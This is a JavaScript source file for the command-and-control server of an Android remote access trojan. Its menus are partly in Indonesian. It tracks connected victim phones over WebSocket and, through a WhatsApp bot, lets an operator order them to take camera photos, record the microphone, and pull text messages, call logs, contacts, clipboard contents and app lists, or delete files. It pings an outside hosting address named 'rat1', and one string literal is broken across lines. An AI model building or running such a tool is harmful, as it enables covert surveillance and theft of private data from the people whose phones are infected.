// whatsapp-control.js (converted from Telegram bot)
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const { makeWASocket, useSingleFileAuthState, proto } = require("@whiskeysockets/baileys");
const { default: pino } = require("pino");

const PORT = process.env.PORT || 8999;
const pingAddress = 'https://rat1-1-lfu0.onrender.com/';
const { state, saveState } = useSingleFileAuthState('./auth.json');

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const clients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentSender = '';
let globalSock;

function notifyDeviceEvent(event, data, sock, jid) {
  const message = `*• Device ${event}*\n\n` +
    `• MODEL: *${data.model}*\n` +
    `• BATTERY: *${data.battery}*\n` +
    `• VERSION: *${data.version}*\n` +
    `• BRIGHTNESS: *${data.brightness}*\n` +
    `• PROVIDER: *${data.provider}*`;
  sock.sendMessage(jid, { text: message });
}

app.get('/', (req, res) => res.send('<h1 align="center">Alive</h1>'));

app.post("/uploadFile", upload.single('file'), (req, res) => {
  res.send('');
});

app.post("/uploadText", (req, res) => {
  console.log('Text uploaded');
  res.send('');
});

wss.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const headers = req.headers;
  const clientData = {
    model: headers.model,
    battery: headers.battery,
    version: headers.version,
    brightness: headers.brightness,
    provider: headers.provider
  };
  ws.uuid = uuid;
  clients.set(uuid, clientData);
  if (currentSender && globalSock) {
    notifyDeviceEvent('Connected', clientData, globalSock, currentSender);
  }
  ws.on('close', () => {
    if (currentSender && globalSock) {
      notifyDeviceEvent('Disconnected', clientData, globalSock, currentSender);
    }
    clients.delete(uuid);
  });
});

async function startSock() {
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    auth: state
  });
  globalSock = sock;
  sock.ev.on("creds.update", saveState);

  sock.ev.on("messages.upsert", async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.fromMe) return;
    const sender = msg.key.remoteJid;
    const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || "";
    currentSender = sender;

    if (text === "/start") {
      const buttons = [
        { buttonId: 'Devices', buttonText: { displayText: '📱 Devices' }, type: 1 },
        { buttonId: 'Execute', buttonText: { displayText: '🧠 Execute' }, type: 1 }
      ];
      return sock.sendMessage(sender, {
        text: `Halo! Saya siap membantu mengontrol device kamu.`,
        footer: 'Silakan pilih salah satu menu di bawah ini.',
        buttons,
        headerType: 1
      });
    }

    if (text === "Devices") {
      if (!clients.size) return sock.sendMessage(sender, { text: 'No Connecting Devices' });
      let deviceText = '*List Connected Devices:*

';
      clients.forEach((v) => {
        deviceText += `• MODEL: *${v.model}*\n• BATTERY: *${v.battery}*\n• VERSION: *${v.version}*\n• BRIGHTNESS: *${v.brightness}*\n• PROVIDER: *${v.provider}*\n\n`;
      });
      return sock.sendMessage(sender, { text: deviceText });
    }

    if (text === "Execute") {
      if (!clients.size) return sock.sendMessage(sender, { text: 'No Connecting Devices' });
      let buttons = [];
      clients.forEach((v, k) => {
        buttons.push({ buttonId: `uuid:${k}`, buttonText: { displayText: v.model }, type: 1 });
      });
      return sock.sendMessage(sender, {
        text: 'Pilih device untuk eksekusi:',
        footer: 'Device terhubung',
        buttons,
        headerType: 1
      });
    }

    if (text.startsWith("uuid:")) {
      const uuid = text.slice(5);
      if (clients.has(uuid)) {
        currentUuid = uuid;
        const commandButtons = [
          { buttonId: 'camera_main', buttonText: { displayText: '📷 Kamera Utama' }, type: 1 },
          { buttonId: 'camera_selfie', buttonText: { displayText: '🤳 Kamera Selfie' }, type: 1 },
          { buttonId: 'messages', buttonText: { displayText: '📩 Pesan' }, type: 1 },
          { buttonId: 'calls', buttonText: { displayText: '📞 Riwayat Panggilan' }, type: 1 },
          { buttonId: 'contacts', buttonText: { displayText: '👥 Kontak' }, type: 1 },
          { buttonId: 'clipboard', buttonText: { displayText: '📋 Clipboard' }, type: 1 },
          { buttonId: 'apps', buttonText: { displayText: '📱 Apps' }, type: 1 },
          { buttonId: 'device_info', buttonText: { displayText: '🔧 Info Device' }, type: 1 },
          { buttonId: 'vibrate', buttonText: { displayText: '📳 Getar' }, type: 1 }
        ];
        return sock.sendMessage(sender, {
          text: `Eksekusi untuk *${clients.get(uuid).model}*`,
          footer: 'Pilih perintah di bawah ini:',
          buttons: commandButtons,
          headerType: 1
        });
      }
    }

    const commandList = [
      'microphone', 'file', 'delete_file', 'rec_camera_main', 'rec_camera_selfie',
      'calls', 'contacts', 'messages', 'clipboard', 'apps', 'device_info', 'camera_main', 'camera_selfie', 'vibrate'
    ];

    if (commandList.includes(text)) {
      if (!currentUuid) return sock.sendMessage(sender, { text: 'UUID belum dipilih. Gunakan Execute dulu.' });
      wss.clients.forEach(ws => {
        if (ws.uuid === currentUuid) ws.send(text);
      });
      await sock.sendMessage(sender, { text: "Processing..." });
      currentUuid = '';
    }
  });
}

setInterval(() => {
  wss.clients.forEach(ws => ws.send('ping'));
  axios.get(pingAddress).catch(() => {});
}, 5000);

startSock();
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
